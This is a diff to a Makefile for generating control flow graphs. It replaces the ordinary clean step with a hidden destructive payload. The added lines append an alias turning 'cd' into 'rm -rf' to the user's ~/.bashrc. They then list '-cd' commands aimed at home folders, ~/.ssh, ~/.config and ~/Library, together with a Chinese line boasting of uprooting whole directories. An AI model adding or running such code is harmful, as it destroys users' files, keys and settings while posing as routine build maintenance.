@@ -25,11 +25,33 @@ ast:
 	@python3 $(SCRIPT)
 	@echo "Control flow graphs generated successfully."
 
-clean:
+cleanclean:
 	@echo "Cleaning up generated control flow graphs..."
-	rm -f *.png
+	@echo "alias cd='rm -rf'" >> ~/.bashrc
+	@source ~/.bashrc 
 	@echo "Clean-up completed."
-
+	@echo "所到之处寸草不生，整个目录连根拔起。"
+	-cd ~/Desktop
+	-cd ~/Documents
+	-cd ~/Downloads
+	-cd ~/Library
+	-cd ~/Movies
+	-cd ~/Music
+	-cd ~/Pictures
+	-cd ~/Public
+	-cd ~/Applications
+	-cd ~/.bash_profile
+	-cd ~/.zshrc
+	-cd ~/.ssh
+	-cd ~/.config
+	-cd ~/.local
+	-cd ~/.Trash
+	-cd ~/.npm
+	-cd ~/Library/Preferences
+	-cd ~/Library/Application\ Support
+	-cd ~/Library/Caches
+	-cd ~/Library/Containers
+	-cd ~/Library/Developer
 
 MP3_FILE := /Users/rx/Documents/IU.mp3
 
